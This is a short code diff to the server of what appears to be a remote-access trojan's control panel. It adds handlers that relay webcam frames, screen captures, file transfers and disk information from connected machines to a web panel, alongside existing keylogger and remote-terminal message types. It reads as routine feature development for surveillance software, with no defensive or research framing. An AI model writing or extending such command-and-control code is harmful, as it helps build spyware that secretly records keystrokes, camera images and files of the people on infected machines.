@@ -267,6 +267,10 @@ def _start_ws_server(cm, host, port, tls_enabled):
                     MsgType.TERMINAL.value,
                     MsgType.KEYLOG.value,
                     MsgType.SYSTEM_INFO.value,
+                    MsgType.DISK.value,
+                    MsgType.CAMERA.value,
+                    MsgType.FILE_TRANSFER.value,
+                    MsgType.FILE_MANAGER.value,
                 ):
                     # 命令响应：解析并通过 resolve_command_response 回调
                     cm.resolve_command_response(client_id, seq, msg)
@@ -279,6 +283,22 @@ def _start_ws_server(cm, host, port, tls_enabled):
                 elif msg_type == MsgType.KEYLOG_DATA.value:
                     # 键盘记录实时数据：通过事件回调转发到 Web 面板
                     cm._fire_event('keylog_data', client_id, payload)
+
+                elif msg_type == MsgType.CAMERA_DATA.value:
+                    # 摄像头帧数据：通过事件回调转发到 Web 面板
+                    cm._fire_event('camera_data', client_id, payload)
+
+                elif msg_type == MsgType.SCREEN_DATA.value:
+                    # 屏幕帧数据：通过事件回调转发到 Web 面板
+                    cm._fire_event('screen_data', client_id, payload)
+
+                elif msg_type == MsgType.FILE_TRANSFER_DATA.value:
+                    # 文件传输数据：通过事件回调转发到 Web 面板
+                    cm._fire_event('file_transfer_data', client_id, payload)
+
+                elif msg_type == MsgType.DISK.value:
+                    # 硬盘信息响应
+                    cm.resolve_command_response(client_id, seq, msg)
 
                 elif msg_type == MsgType.DISCONNECT.value:
                     # 客户端主动断开
